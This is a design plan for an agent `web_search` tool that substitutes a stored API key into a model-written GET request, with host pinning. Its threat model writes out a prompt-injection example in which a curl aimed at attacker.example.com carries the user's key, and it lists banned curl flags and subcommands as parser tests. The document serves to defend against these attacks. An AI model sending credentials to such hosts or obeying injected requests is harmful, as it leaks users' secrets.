# `web_search` Agent Tool — Config-Supplied Templates, Backend-Substituted Key (rev 4)

> **Rev 4 (2026-10-02).** Answers the question rev 3 left open: **"if config is only `{url, key}`, how does the model know the API?"** It cannot — rev 3 had a real hole and hand-waved it as a follow-up. Rev 4 restores a **curl template in config** (it was in rev 2 and I wrongly dropped it), and adds the piece that makes it work: **the backend injects each provider's template into the model's system prompt**, so the model is handed a ready-to-edit request instead of guessing the header name and query parameter.
>
> Rev 4 also fixes a **bug rev 3 would have shipped**: `ctx.config` is the `LlmConfig` **singleton**, and in `--auth` mode the singleton never sees what the user saved — the PUT returns early before its live-reload block. So `ctx.config.web_search` would have been empty for every auth-mode user. The fix is to mirror `skill_evals_config.resolve`, which exists precisely because that trap already bit this codebase once.
>
> **Rev 3 (2026-10-02).** Rewritten after review: **the agent supplies the request, the backend supplies the secret.** The tool takes `{provider, curl}`; the model writes the URL and headers (with `{key}` where the credential goes) and the backend substitutes the stored key. Config collapses to a name → `{url, key}` map.
>
> Rev 2 put `example_curl` in config and had the tool loop over providers automatically. Rev 3 is simpler and strictly more flexible — the model controls location, language, result count, and any provider-specific parameter without a config change — but it moves the **request** from the admin's control to the model's, which creates one blocking security requirement (**D3**, host pinning) and changes the fallback story (**D8**, the model falls back, not the loop).

> **For agentic workers:** REQUIRED SUB-SKILL: Use `subagent-driven-development` (recommended) or `executing-plans` to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Give the agent a `web_search` tool that does a real Google-style search — "latest FIFA World Cup news today" returns ranked `{title, url, snippet, site_name}` results. The user configures each provider by pasting **the curl command from that provider's own documentation**, plus a key. The backend shows the model a ready-to-edit template for every configured provider, so the model never has to guess an API. **The model never sees the key, and can never cause it to be sent to a host the user did not pin for that provider.**

**Architecture:** Five layers, no new table.

1. **Config is a name → `{url, key, curl}` map.** The `curl` is the curl the user copied out of the provider's docs, with `{key}` where the credential goes. This is the only thing that makes "any provider, no code change" true — **the model cannot know that TinyFish wants `X-API-Key` and not `Authorization: Bearer` unless something tells it.**
2. **The backend injects those templates into the system prompt**, as a `## Web Search Providers` section rendered by `buildMessages` only when the `web_search` tool is equipped. The model receives a copy-paste-ready request per provider and edits the query text.
3. **A minimal GET-only curl parser** turns the model's `curl` argument into a request: the URL, the static headers, and the position of `{key}`.
4. **The backend substitutes `{key}`** — but only after the request's host has been checked against the pinned `url`. This is the whole security story.
5. **The model falls back.** When a provider's quota is exhausted the error names the other configured providers, and the model re-issues with a different one.

**The prompt and the tool must read the same config.** Both go through one helper, `web_search_config.resolve(allocator, db, session_id)` — never `ctx.config` directly. See D14; getting this wrong is the exact bug that made Skill Evals silently refuse every call.

**Tech Stack:** Zig 0.16 (`AgentTool`, `ToolProperty`, `ToolExecContext`, `wrapToolOutput`), `kabelweb` HTTP client, `LlmConfig` JSON config, Vue 3 + vitest, python functional harness.

## Global Constraints

- **Never touch the process on port 8081.** Functional tests use the harness's random port (8080–8199).
- **No live-server `curl` for verification.** Use `tests/functional/harness.py`; the `nohup … --port 8080 &` + `curl` anti-pattern misses route-order and empty-slice-binds-as-NULL failures.
- **`SqliteBackend.exec` binds `""` as SQL NULL.** An unset key must be *absent from the JSON object*, never `""`.
- **No `// NEW (plan: …)` comments** in source.
- **`///` doc comments cannot be attached to a `test` decl** — use `//` inside test blocks.
- **`std.json.ObjectHashMap` has no `.has()`** — use `.get(k) != null`.
- **Zig 0.16's `std.Uri` has no query-string API.** `Uri.query` is a `Component`; there is no `parseQuery` / `addQueryParam`. Query handling is hand-rolled (Task 2).
- **Per-request arena:** `ctx.allocator` is arena-backed — do not `defer free` arena slices inside exec adapters.
- **Never shell out to the model's `curl` string.** It is parsed into a template and executed with the `kabelweb` client. Passing a model-authored string to a shell is arbitrary command execution.
- **Never substitute `{key}` before the host check passes.** Order matters and is the security boundary; see D3.
- **Cross-platform:** the current shim calls `agent-browser`, which does not exist on Windows.
- **Verification gates:** `zig build test --summary all`; `(cd src/apps/desktop && pnpm test:unit)` and `pnpm run build`; `zig build install:linux` then `NALAR_BIN=$(pwd)/zig-out/bin/nalarcore-linux-x86_64 python3 -m pytest tests/functional/web_search_config_test.py -v`.

## Current State (verified 2026-10-02 in this worktree, `origin/main` @ `25f1ed19`)

### The `web_search` name is occupied by dead code

| Fact | Location |
|---|---|
| `web_search.zig` is a **URL browser**, not a search: it shells out to `agent-browser snapshot {url}` and returns raw stdout as `content` | `src/modules/agent/tools/web_search.zig:10` |
| Its schema is `{url}` only — no query string, no ranking, no results array | `src/modules/agent/tools/web_search.zig:70-85` |
| **It is unreachable.** The registry entry is commented out | `src/agentic_loop/tools_equipped.zig:306` |
| It is **absent from `equips()`** — the list the LLM is actually shown | `src/agentic_loop/tools_equipped.zig:78` (only the module alias on `:41`) |
| The exec adapter exists and is wired in | `src/agentic_loop/tools_exec_web_search.zig:12`, re-exported at `src/agentic_loop/tools.zig:48` |
| `const web_search_mod = nalarcore.web_search;` in the prompt builder is declared and **never referenced** — a dead const | `src/agentic_loop/prompts_build_messages_for_agent_prompt.zig:68` |

**Consequence:** nothing a user does today can produce a `web_search` call, so repurposing the name breaks no live session. `agent-browser snapshot <url>` is a shell command the unified `command` tool runs verbatim, so nothing is lost by deleting the shim.

### The agent already has unrestricted network egress

`command` → `shell.zig` spawns `bash -c` / `pwsh -Command` (`src/modules/agent/tools/shell.zig:20`, `:28`) with no command allowlist. The model can already run `curl https://anything`.

**This is the correct frame for the security design.** The model has *egress* today. What it does **not** have is a *credential*. So the invariant to protect is narrow and precise:

> The model must not be able to make a request that **carries the search API key** to a host the user did not pin.

D3 is the entire defence for that, and it is the one requirement in this plan that is not optional.

### The existing structs are browser-shaped

| Struct | Location | Problem |
|---|---|---|
| `WebSearchInput { url, cwd }` | `src/modules/agent/tools/schemas.zig:100` | No `query`. `cwd` only drives the `agent-browser` shell-out. |
| `WebSearchResult { success, content, exit_code, error_msg }` | `src/modules/agent/tools/schemas.zig:107` | `exit_code` and stdout-as-`content` are bash-shaped. |

`generate_image` keeps its input/result types **local to its own module** (`src/modules/agent/tools/generate_image.zig:51`, `:78`). Follow that.

### The outbound-HTTP pattern to copy

`src/modules/agent/tools/generate_image.zig` is the in-repo reference for a tool that calls a third-party JSON API.

| Step | Location (all `src/modules/agent/tools/generate_image.zig`) | Note |
|---|---|---|
| Client import | `:14` | `const custom_http_client = @import("kabelweb").client;` |
| Response cap | `:24` | `MAX_RESPONSE_BYTES` |
| Scheme validation before the request | `:548-556` | Rejects a URL with no `http://`/`https://` prefix. Its own comment cites `Agent.zig:1799-1821`, which has since drifted; the live scheme check is `Agent.zig:2939` |
| Headers | `:564-567` | `[_]custom_http_client.Header{ .{ .name, .value } }` |
| Request | `:569-574` | `Request{ .method, .url, .headers, .body }` |
| Options | `:578-582` | `Options{ .timeout_ms, .connect_timeout_ms, .follow_redirects, .verify_ssl }` |
| Perform | `:586-590` | `Client.init(allocator)` … `perform` … `deinit` |
| Status check | `:601-614` | `>= 400` → extract the provider's message, prefix `HTTP {d}` |
| Size cap | `:619-628` | Checked **before** parsing |
| Error envelope | `:472` | `toJSONError` → `{"error": msg}` |
| Exec adapter | `src/agentic_loop/tools_exec_generate_image.zig:80-103` | Re-parses its own payload, re-wraps `error` as `success=false` |

### Config plumbing (no migration needed)

| Fact | Location |
|---|---|
| `ToolExecContext.config` is the resolved per-user `*const LlmConfig` | `src/agentic_loop/tools.zig:101` |
| JSON parse struct; `tools: ?[]const []const u8 = null` is the shape to mirror | `src/modules/config/Config.zig:466` |
| LLM profile keys are already plaintext in `config.json` | `src/modules/config/Config.zig:117`, `:288`, `:347` |
| `McpServerConfig { url, headers, … }` — the existing url+secret shape | `src/modules/config/Config.zig:519-553` |
| Frontend mirror `NalarConfig.tools?: string[] \| null` | `src/apps/desktop/src/api/index.ts:4519` |
| Per-user config round-trips through `users.config_json` | `src/modules/config/UserConfigStore.zig:3` |
| **`GET /api/config/nalar` is an explicit allowlist, and there are TWO of them** | `src/http_handlers/nalar_config_get.zig:59-81` and `:143-174` |
| `profiles` rides through raw, so LLM keys already reach the browser | `src/http_handlers/nalar_config_get.zig:60`, `:147` |
| PUT applies keys one at a time, each with its own validator | `src/http_handlers/nalar_config_put.zig:192` (`applyToolsInput`) |
| Settings sections mount in one place | `src/apps/desktop/src/components/NalarSettings.vue:852`, `:876`, `:884` |
| MCP servers section is the url+secret UI precedent | `McpServersSection.vue`, `McpServerModal.vue`, `McpHeadersEditor.vue`, `mcpServers.ts` |

> **Two allowlists, not one.** Editing only the auth-mode branch drops the key silently in non-auth deployments. Task 6 names both.

### Every place a tool name must appear

A name in `equips()` with no registry entry renders in the UI exactly like a hung tool. The guard test at `tools_equipped.zig:449` covers alias drift only — there is no `equips()` ↔ registry parity test.

| Surface | Location | Required |
|---|---|---|
| Tool definition | `src/modules/agent/tools/web_search.zig` | new `web_search_tool` + `.system_prompt` (the static half of D14) |
| Registry (dispatch) | `src/agentic_loop/tools_equipped.zig:305-306` | **uncomment + rewrite** |
| Equipped list (LLM visibility) | `src/agentic_loop/tools_equipped.zig:78` | **add** |
| Default seed | `src/agentic_loop/tools_equipped.zig:331` | add (D9) |
| Exec adapter export | `src/agentic_loop/tools.zig:48` | present |
| Root export | `src/root.zig:958` | present |
| Settings → Tools group | `ToolsSection.vue:83` `GROUP_BY_TOOL` | `web_search: 'Search'` (group exists `:68`) |
| Settings → default-on list | `ToolsSection.vue:27` `BUILTIN_DEFAULT_TOOLS` | mirror D9 |
| Chat inline preview | `src/apps/desktop/src/helpers/renderResponse.ts:212-220` | decide |
| Tool-output parser | `src/apps/desktop/src/components/tool_outputs/_shared/toolOutputParser.ts` (see `:738`) | `parseWebSearch` |
| Tool-output component | `src/apps/desktop/src/components/tool_outputs/WebSearch.vue` | new |
| Android tool card | `ToolCardModel.kt:565-572` | `ToolKind.WebSearch` + test |

## Design Decisions (for reviewer)

**D1 — Reclaim `web_search`; delete the URL-browser shim.**
*Rejected:* renaming it to `web_fetch`. It is unreachable dead code whose entire behaviour is a shell command `command` already runs, and `agent-browser` does not exist on Windows.
*Cost:* `docs/superpowers/plans/2026-08-06-show-preview-local-file.md:110` cites `web_search` as URL-fetch coverage — correct it in this PR.

**D2 — Config is a flat name → `{url, key, curl}` map.**
```jsonc
"web_search": {
  "tinyfish": {
    "url":  "https://api.search.tinyfish.ai",
    "key":  "skkkk",
    "curl": "https://api.search.tinyfish.ai?query=latest+FIFA+World+Cup+news+today&location=US&language=en -H \"X-API-Key: {key}\" -H \"X-TF-Request-Origin: api\" -H \"X-TF-API-Source: onboarding\""
  },
  "brave": {
    "url":  "https://api.search.brave.com",
    "key":  "sk-...",
    "curl": "https://api.search.brave.com/res/v1/web/search?q=PLACEHOLDER -H \"X-Subscription-Token: {key}\" -H \"Accept: application/json\""
  }
}
```

| Field | Meaning |
|---|---|
| map key | The provider name the model passes as `provider`. Free-form; the user picks it. |
| `url` | **The host pin** (D3). Also what the settings UI shows and what the error message quotes when suggesting an alternative. |
| `key` | The credential. Never echoed to the model (D7). |
| `curl` | The request template — copied from the provider's own docs, with `{key}` where the credential goes. Shown to the model verbatim (D13); the model edits it per call. |

*Rejected (rev 3):* dropping `curl` and letting the model invent the request. **This was wrong, and the reviewer caught it.** Given only `{url, key}` the model cannot know the auth header name (`X-API-Key` vs `Authorization: Bearer` vs `X-Subscription-Token`), which parameter carries the query (`query` vs `q`), or which extra headers the provider demands (`X-TF-Request-Origin: api`). It would guess, and a guess fails.
*Rejected:* an array with a `provider` field. A JSON object is the natural shape for "name → settings" and needs no separate id field.
*Why `url` **and** `curl` both hold a URL:* they are different things and both are load-bearing. `url` is the **trust boundary** (which host may ever receive the key). `curl` is the **transport template** (what to actually send). Deriving the pin from `curl` would be wrong — the model is about to send a *different* URL, and the pin must describe the approved origin, not the one being requested.
*Optional per entry:* `"enabled": false` to park an exhausted provider without deleting its key. Mirrors `McpServerConfig.enabled` (`Config.zig:532`).

**D3 — HOST PINNING. The request host must equal the pinned `url` host, checked BEFORE `{key}` is substituted. This is the security boundary.**
*Why it is mandatory, concretely.* Without it, a prompt injection — a web page the agent read, a document in the repo, an MCP tool result — can write:

```
provider: "tinyfish"
curl:     "https://attacker.example.com/collect -H \"X-API-Key: {key}\""
```

The backend would faithfully substitute the user's real TinyFish key and hand it to a stranger. The agent already has unrestricted egress (D-section above); this design would give it a *credentialed* egress to any host, which is a strictly new capability and exactly the one thing not to add.

With pinning, that same call is refused:

```json
{ "error": "web_search refused: curl host 'attacker.example.com' does not match the pinned host 'api.search.tinyfish.ai' for provider 'tinyfish'.",
  "host_mismatch": true, "pinned_host": "api.search.tinyfish.ai", "requested_host": "attacker.example.com" }
```

**and no key is read, substituted, or transmitted.** The refusal happens before the key is touched at all.

Rules, in enforcement order:
1. Resolve `provider` in config. Unknown ⇒ error listing the **configured provider names** (never keys).
2. Parse the `curl` argument — no key involved.
3. **Compare the request host to the pinned host.** Mismatch ⇒ refuse, return the envelope above, stop.
4. Re-parse the pinned `url` the same way and reject a config `url` that is not `https`, or that is loopback / link-local / private (defence in depth: a mistyped config should not silently create an SSRF target).
5. Reject CR/LF in any header name or value.
6. Locate `{key}`. Exactly one occurrence required.
7. **Only now** substitute and send.

**D4 — `{key}` may appear in a header value or in the URL query.**
Some search APIs take the credential as a query parameter (`SerpApi ?api_key=`, Google CSE `?key=`), so a header-only rule would lock those out.
*Cost, stated plainly:* a key in the URL can land in proxy and server access logs. That is the provider's choice, not ours, but the docs must say so, and the settings UI should mark such a template.

**D5 — Accept the `curl` argument with or without a leading `curl` command.**
Users and models copy complete curl commands from provider docs. `https://… -H "…"` and `curl "https://…" -H "…"` must both parse. A leading `curl` token is stripped if present; anything else that looks like a subcommand (`wget`, `sh`, `python`) is an **error**, not a stripped token.

**D6 — GET only. `-X`, `-d`, `--data`, `--data-raw`, `-T`, `-o`, `-O`, `--upload-file` are all errors, named.**
*Rejected:* silently ignoring them. A paste containing `-X POST` that we ignore **changes the meaning of the request** while appearing to succeed. Erroring at parse time is the only honest behaviour, and the model can fix its own call from the error message.

**D7 — The model never sees the key. Two claims, kept separate.**

*Guaranteed (testable):* the key appears in no tool result, no error envelope, and no log line. Verification is a sentinel test — the whole path runs with `key = "SENTINEL_SECRET_DO_NOT_LEAK"`, and the assertion is that the string appears in no envelope and in no `std.log` output. Plus a source-contract test forbidding any `allocPrint` in the module that takes the key.

*Not guaranteed by this tool (pre-existing):* `GET /api/config/nalar` passes `profiles` through raw (`nalar_config_get.zig:60`, `:147`), so LLM keys already reach the browser today.
*Chosen (D11):* mask the search key on GET; treat the mask as "unchanged" on PUT.

**D8 — The MODEL falls back, not the loop.**
This is the honest consequence of moving the request into the tool arguments: when a provider is exhausted, the backend cannot re-issue against a different provider, because only the model knows that provider's URL and header shape.

So the exhaustion envelope **names the alternatives**, and the model re-issues:

```json
{ "error": "Search provider 'tinyfish' quota exhausted (HTTP 429).",
  "provider": "tinyfish", "exhausted": true,
  "other_providers": [ { "name": "brave", "url": "https://api.search.brave.com" } ],
  "hint": "Retry with provider 'brave' and a curl for https://api.search.brave.com — put {key} where its credential goes." }
```

`other_providers` carries names and URLs only. Both are non-secret, and the URL is what makes the model's next call constructible.

*Rejected (rev 2):* an automatic in-order loop over a config-supplied curl per provider. It required storing every provider's transport in config, which duplicates the model's request and re-creates the two-sources-of-truth problem.
*Trade-off, stated:* the model costs one extra round trip on fallback and might not retry. In exchange the request stays where the user wants it — under the model's control — and the config stays tiny.

**D9 — Exhaustion detection is status-code first, body-pattern second.**
`429`, or `401`/`403` with a body matching `/quota|rate.?limit|exceeded|free.? tier/i`, ⇒ exhaustion. Any other `>= 400` ⇒ an ordinary error carrying the provider's own message (`generate_image.zig:601-614`).
*Why keep them apart:* a bad API key (`401`, no quota wording) must say "check your API key", not "you used up your free tier". Conflating them sends the user to the wrong page.

**D10 — `web_search` is default-ON for agent + kanban items.**
`DEFAULT_AGENT_TOOLS` (`tools_equipped.zig:331`) is the creation-time seed and mirrors the frontend `BUILTIN_DEFAULT_TOOLS` (`ToolsSection.vue:27`); the comment at `tools_equipped.zig:322-329` calls out that the two must agree.
*Why:* an unconfigured tool returns a one-line "not configured" message, so enabling it by default costs nothing until a key exists, and it is available immediately when one is added.
*Risk:* `web_search` sits in every new agent's `tools[]` for users who never configure it. **Flagged for the reviewer.**

**D11 — `GET` masks the key; `PUT` treats the mask as "unchanged".**
`GET /api/config/nalar` returns each `key` as `"sk…7f2"` (first 3 + last 3; a fixed `"••••"` when shorter than 10 chars). `PUT` compares against the mask and keeps the stored value on a match.
*Rejected:* sending the real key like LLM keys do — fewer lines, consistent with today.
*Why:* the mask is ~20 lines, and it means a devtools panel, a shared screenshot, or a `GET` pasted into a bug report cannot leak a search key. Choosing the weaker option only because the stronger one is inconvenient is how the weaker option becomes permanent.
*Note:* deliberately **beyond** what LLM keys get today. Widening it to them is a separate change.

**D12 — The tool schema is exactly two parameters, and the description carries a worked example.**
```json
{ "provider": "tinyfish",
  "curl": "https://api.search.tinyfish.ai?query=latest+FIFA+World+Cup+news+today&location=US&language=en -H \"X-API-Key: {key}\" -H \"X-TF-Request-Origin: api\" -H \"X-TF-API-Source: onboarding\"" }
```

The model is good at this but not free: emitting a ~250-character curl on every search costs tokens and will occasionally be malformed. Mitigations, in order of value:
1. **A worked example in `.description`**, in the `generate_image.zig:109-137` INPUT / BEHAVIOUR / OUTPUT / AUTH style, showing the exact TinyFish shape with `{key}` already placed.
2. **Errors the model can act on** — "your curl must contain `{key}`", "unexpected flag `-o`", "no `query=` parameter found" — each naming the fix.
3. **The `.system_prompt`** states that `web_search` is for the open internet, while `search` / `glob` are for this repository, so the model does not waste a search call on local code.

*Known follow-up, not in this PR:* the description is a `comptime` literal and cannot list the user's providers. Building the provider list into the system prompt dynamically (`prompts.zig`'s `build_agent_prompt` already assembles config-dependent sections) would let the prompt carry a ready-to-edit template per provider and remove most of the token cost. Worth doing once a second provider is actually configured.

**D13 — Structured results, mirroring the provider's response.**
`position`, `title`, `url`, `site_name`, `snippet`, `total_results`. `url` and `title` are required; `site_name` and `snippet` are optional, so a provider with a different shape degrades to fewer fields instead of failing to parse. Snippets are truncated against a cap (the `SUMMARY_MAX` pattern, `progressive_catalog.zig:820`) so a long result page cannot flood the context.

**D14 — The backend renders a `## Web Search Providers` section into the system prompt.**
This is the answer to *"how does the model know the API?"* — the model is handed the answer instead of being asked to guess it.

`buildMessages` (`src/agentic_loop/prompts_build_messages_for_agent_prompt.zig:74`) already renders optional, config-dependent sections behind a `hasTool` gate — `:97` gates `GitPrompt` on `command`, `:101` gates Task Planning on `update_plan`. The providers section copies that exactly:

```zig
if (hasTool(filtered_tools, "web_search")) {
    const block = web_search_config.renderPromptSection(
        allocator, db, session_id,     // per-session — see D15
    ) catch "";
    defer allocator.free(block);
    if (block.len > 0) {
        try final_system.appendSlice(allocator, "\n\n## Web Search Providers\n\n");
        try final_system.appendSlice(allocator, block);
    }
}
```

Rendered shape:

```
## Web Search Providers

You can search the open internet with the `web_search` tool. Use it for
anything outside this repository — `search` and `glob` are for local files.

Pass `provider` and a `curl` built from the template below: edit only the
search text and any optional parameters. Keep `{key}` exactly where it is —
the backend fills it in and you never see the credential.

### tinyfish
curl: https://api.search.tinyfish.ai?query=REPLACE_WITH_SEARCH_TEXT&location=US&language=en -H "X-API-Key: {key}" -H "X-TF-Request-Origin: api"

### brave
curl: https://api.search.brave.com/res/v1/web/search?q=REPLACE_WITH_SEARCH_TEXT -H "X-Subscription-Token: {key}" -H "Accept: application/json"
```

Three properties that matter:

- **The templates carry `{key}`, never the key.** So injecting them into the model's context is safe by construction — the section cannot leak the secret because it does not contain it. This is the whole reason D4 keeps `key` and `curl` in separate fields.
- **It is gated on `hasTool`,** so a session without `web_search` equipped pays zero tokens, and the section can never describe a provider the tool would refuse.
- **Disabled providers are omitted**, so the model is never told to use one the tool would skip.

*Cost, stated honestly:* roughly 120–200 tokens per configured provider, on every iteration of every session that has the tool. With one provider that is negligible; with ten it is not. A per-session cap (render the first N, and note the rest exist) is the escape hatch if someone configures a lot.
*Rejected (rev 3):* describing the format once in the static `.description` and leaving the model to construct each request. Cheaper, but it means the model guesses the header name on every call — which is the failure the reviewer just caught.

**D15 — Resolve the config PER SESSION, never through `ctx.config`.**
`ToolExecContext.config` (`src/agentic_loop/tools.zig:101`) is the `LlmConfig` **singleton**. In `--auth` mode that singleton never sees what the user saved: the config PUT **returns early** in auth mode — its own comment says *"the global singleton is NOT swapped (config is per-user)"* (`src/http_handlers/nalar_config_put.zig:522-538`, early return at `:535`). `src/agentic_loop/skill_evals_config.zig:6-19` documents this trap in full — it exists because the Skill Evals toggle read the database while the tool read the singleton, so the checkbox looked like it worked and every call refused.

So `ctx.config.web_search` would be **empty for every auth-mode user**, and the symptom would be a Settings page that saves correctly and a tool that always says "not configured".

The fix is the existing one, copied: a new `src/agentic_loop/web_search_config.zig` exposing `resolve(allocator, db, session_id) ?WebSearchProviders`, using the same shape as `skill_evals_config.resolve` (`:41-56`) — a narrow parse struct with `ignore_unknown_fields`, `user_config_store.loadRaw(allocator, db, owner)`, and `null` for every non-authoritative case so the failure mode stays the pre-existing one.

**Both** the prompt renderer (D14) and the exec adapter call `web_search_config.resolve`. One source, or the prompt describes provider A while the tool dispatches provider B — which is the same class of bug as the Skill Evals trap, one layer over.

## Wire Contract

### `config.json` (new optional key — **no migration**)

```jsonc
{
  "web_search": {
    "tinyfish": {
      "url":  "https://api.search.tinyfish.ai",
      "key":  "skkkk",
      "curl": "https://api.search.tinyfish.ai?query=latest+FIFA+World+Cup+news+today&location=US&language=en -H \"X-API-Key: {key}\" -H \"X-TF-Request-Origin: api\""
    },
    "brave": { "url": "https://api.search.brave.com", "key": "sk-...", "enabled": false }
  }
}
```

Absent or empty ⇒ "not configured". An entry that is disabled, or has a blank `url` / `key` / `curl`, is skipped, never rendered into the prompt, and never named in `other_providers`. An entry whose `curl` does not parse is skipped **and logged at `warn` with the provider name only** — a broken template must not take the whole tool down.

**The prompt section (D14) renders `curl` verbatim with `{key}` intact and never the `key` value.** That is the same string the model must echo back, so the user can see in Settings exactly what the model was told.

### Tool call

```json
{ "provider": "tinyfish",
  "curl": "https://api.search.tinyfish.ai?query=latest+FIFA+World+Cup+news+today&location=US&language=en -H \"X-API-Key: {key}\" -H \"X-TF-Request-Origin: api\"" }
```

### Outbound request

```http
GET /?query=latest%20FIFA%20World%20Cup%20news%20today&location=US&language=en HTTP/1.1
Host: api.search.tinyfish.ai
X-API-Key: skkkk
X-TF-Request-Origin: api
```

### Envelopes

Success:
```json
{ "provider": "tinyfish", "total_results": 10,
  "results": [ { "position": 1, "title": "…", "url": "…", "site_name": "…", "snippet": "…" } ] }
```

Not configured:
```json
{ "error": "web_search is not configured. Add a provider in Settings → Web Search.", "configured": false }
```

Host mismatch (D3) — **the key is never touched**:
```json
{ "error": "web_search refused: curl host 'attacker.example.com' does not match the pinned host 'api.search.tinyfish.ai' for provider 'tinyfish'.",
  "host_mismatch": true, "pinned_host": "api.search.tinyfish.ai", "requested_host": "attacker.example.com" }
```

Malformed `curl` (D5/D6):
```json
{ "error": "web_search: unexpected flag '-o' in curl. Only GET requests are supported (no -o, -d, -X, --upload-file).",
  "invalid_curl": true }
```

Quota exhausted (D8):
```json
{ "error": "Search provider 'tinyfish' quota exhausted (HTTP 429).", "provider": "tinyfish", "exhausted": true,
  "other_providers": [ { "name": "brave", "url": "https://api.search.brave.com" } ],
  "hint": "Retry with provider 'brave' and a curl for https://api.search.brave.com — put {key} where its credential goes." }
```

Bad key (not exhaustion, D9):
```json
{ "error": "Search provider 'tinyfish' rejected the credential (HTTP 401). Check the key in Settings → Web Search.",
  "provider": "tinyfish", "http_status": 401 }
```

## File Map

| Action | File | Responsibility |
|---|---|---|
| **New** | `src/modules/agent/tools/web_search_curl.zig` | The GET-only curl parser (D5, D6). Quote-aware tokenizer; optional leading `curl`; URL + `-H` extraction; locates `{key}` (header value **or** URL query); rejects CR/LF, non-GET flags, subcommands. **Pure — no I/O, no HTTP, and it never touches a key.** |
| **New** | `src/agentic_loop/web_search_config.zig` | Per-session provider resolution (D15), mirroring `skill_evals_config.zig:41-56`. One `resolve(allocator, db, session_id)` used by **both** the prompt renderer and the exec adapter, plus `renderPromptSection` for D14. |
| **Rewrite** | `src/modules/agent/tools/web_search.zig` | `SearchProviderEntry`, host comparison (D3), `{key}` substitution, `execute_web_search`, `parseSearchResponse`, snippet truncation, `toJSONError`. Removes the `bash.zig` import. |
| **Edit** | `src/modules/agent/tools/schemas.zig` | **Delete** `WebSearchInput` / `WebSearchResult` (`:100-117`). |
| **Rewrite** | `src/agentic_loop/tools_exec_web_search.zig` | Parse `{provider, curl}`; read `ctx.config.web_search`; call `execute_web_search`; re-wrap `error` payloads as `success=false` per `tools_exec_generate_image.zig:80-103`. |
| **Edit** | `src/agentic_loop/tools_equipped.zig` | `:306` uncomment + repoint; add to `equips()` `:78`; add to `DEFAULT_AGENT_TOOLS` `:331` (D10). |
| **Edit** | `src/modules/config/Config.zig` | `WebSearchProvidersMap = std.StringHashMap(WebSearchProviderEntry)` beside `McpServerConfig` (`:519`); `web_search: ?std.json.Value = null` beside `tools` (`:466`); owned field + parse + free. |
| **Edit** | `src/http_handlers/nalar_config_get.zig` | **Both** allowlist branches (`:59-81`, `:143-174`) get `.web_search`, **masked** (D11). |
| **Edit** | `src/http_handlers/nalar_config_put.zig` | `applyWebSearchInput` beside `applyToolsInput` (`:192`): validate each `url` is `https` and non-private, mask-preserve keys, hot-reload `di.llm_config`. |
| **Edit** | `src/apps/desktop/src/api/index.ts` | `web_search?: Record<string, WebSearchProviderEntry> \| null` on `NalarConfig` (`:4519` vicinity). |
| **New** | `src/apps/desktop/src/components/nalar/WebSearchSection.vue` | Rows: provider name, pinned URL, masked key (`type="password"`), **curl textarea**, enabled toggle. Pattern from `McpServerModal.vue`; the curl textarea is the field users actually paste into. |
| **Edit** | `src/apps/desktop/src/components/NalarSettings.vue` | Mount beside `McpServersSection` (`:876`); wire the emit into the same save path. |
| **Edit** | `src/apps/desktop/src/components/nalar/ToolsSection.vue` | `GROUP_BY_TOOL` += `web_search: 'Search'` (`:83`); `BUILTIN_DEFAULT_TOOLS` += `'web_search'` (`:27`) iff D10. |
| **New** | `src/apps/desktop/src/components/tool_outputs/WebSearch.vue` | Ranked results + provider badge. Pattern from `GenerateImage.vue`. |
| **Edit** | `src/apps/desktop/src/components/tool_outputs/_shared/toolOutputParser.ts` | `parseWebSearch` + `ParsedWebSearch` (pattern from `:738`). |
| **Edit** | `src/apps/desktop/src/helpers/renderResponse.ts` | Decide inline preview at `:212-220` (recommended: bare name — a query plus 10 results is too wide for a chip). |
| **Edit** | `src/apps/android_mobile/.../chat/ToolCardModel.kt` | `toolName == "web_search" -> ToolKind.WebSearch` at `:565-572` + test case. |
| **New** | `tests/functional/web_search_config_test.py` | List round-trips through `PUT`/`GET`; keys come back **masked**; a `http://` or private `url` is rejected with a 400. |
| **Edit** | `docs/superpowers/plans/2026-08-06-show-preview-local-file.md` | `:110` cites `web_search` as URL-fetch coverage — now false (D1). |

## Tasks

- [ ] **Task 1 — Config types.**
  `WebSearchProviderEntry { url, key, curl, enabled }` and `WebSearchProvidersMap` in `Config.zig`; the `web_search` JSON key on both `LlmConfigJson` and the owned `LlmConfig`; parse + free. Map semantics: absent ⇒ none; an entry with a blank `url`/`key`/`curl` or `enabled: false` is skipped everywhere.
  Verify: `zig build test --summary all` — parse/free round-trip; one enabled + one disabled entry both load; a disabled entry is excluded from `other_providers` **and** from the prompt block.
  Commit: `feat(web-search): WebSearchProviders map on LlmConfig`

- [ ] **Task 2 — `web_search_curl.zig`, the parser (D5, D6). Also validates every config template at PUT time,** so a user finds out their pasted curl is wrong while they are still looking at it, rather than three messages into a conversation.
  Quote-aware tokenizer; optional leading `curl`; a leading subcommand other than `curl` is an error; URL extraction; `-H`/`--header` collection; `{key}` located in a header value **or** the URL query, returning its position; exactly one occurrence enforced; CR/LF rejected in every name and value; `-X -d --data --data-raw --data-urlencode -T -o -O --upload-file` all error **by name**.
  Test table (each a real assertion): the task's TinyFish fragment; the same with a leading `curl` and single quotes; `\` line continuations; a Brave-style `-G --data-urlencode` form; `{key}` absent → error; `{key}` twice → error; `wget …` → error naming the subcommand; CR/LF injection in a header value → error; `-o out.html` → error; empty string → error.
  Verify: `zig build test --summary all`.
  Commit: `feat(web-search): GET-only curl parser for the model-supplied request`

- [ ] **Task 3 — Host pinning + `{key}` substitution (D3, D4).**
  `parseHost(url)` for both the request URL and the pinned config URL; exact host comparison (case-insensitive, port stripped or compared explicitly — pick one and test it); `requirePublicHttpsUrl(config.url)` rejecting non-`https` and loopback/link-local/private ranges. Substitution writes the key into exactly one located position. The exported entry point takes the parsed request and the pinned entry and returns a `Refused` union rather than a partially-built request, so a caller cannot accidentally proceed after a mismatch.
  Verify: `zig build test --summary all`; a test that asserts the refusal path returns **before** any key substitution by passing a sentinel key and asserting it appears nowhere in the refusal output.
  Commit: `feat(web-search): host pinning and {key} substitution`

- [ ] **Task 4 — `execute_web_search` + envelopes (D8, D9, D13).**
  Resolve provider → pin check → substitute → send via the `kabelweb` client using the `generate_image.zig` step order → classify (D9) → build the envelope. All five envelopes from the Wire Contract section. `MAX_RESPONSE_BYTES` 1 MiB. Snippet truncation per D13. `other_providers` assembled from enabled entries other than the one used, **names and URLs only**.
  **Key hygiene (D7):** no `allocPrint` in this module may take the key. Source-contract test greps for it and fails.
  Verify: `zig build test --summary all`; the sentinel test (`key = "SENTINEL_SECRET_DO_NOT_LEAK"`) over every path, including all error branches.
  Commit: `feat(web-search): execute_web_search and structured envelopes`

